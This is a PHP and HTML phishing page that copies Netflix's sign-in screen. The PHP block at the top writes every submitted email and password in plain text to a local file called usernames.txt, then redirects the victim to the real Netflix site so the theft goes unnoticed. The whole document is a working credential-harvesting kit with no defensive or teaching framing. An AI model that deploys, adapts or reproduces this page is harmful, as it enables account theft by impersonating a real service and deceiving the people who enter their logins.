<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://www.netflix.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Netflix – Sign In</title><meta charset="UTF-8"></head>
<body style="background: black; font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
<div style="background: rgba(0,0,0,0.8); width: 320px; margin: auto; padding: 60px 68px 40px; color: white;">
<h1 style="font-size: 32px;">Sign In</h1>
<form method="post">
<input type="text" name="username" placeholder="Email or phone number" style="width: 100%; padding: 16px; margin: 10px 0; background: #333; border: none; color: white;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 100%; padding: 16px; margin: 10px 0; background: #333; border: none; color: white;" required><br>
<button type="submit" style="background: #e50914; color: white; width: 100%; padding: 16px; border: none; font-size: 16px; font-weight: bold;">Sign In</button>
</form>
</div>
</body>
</html>
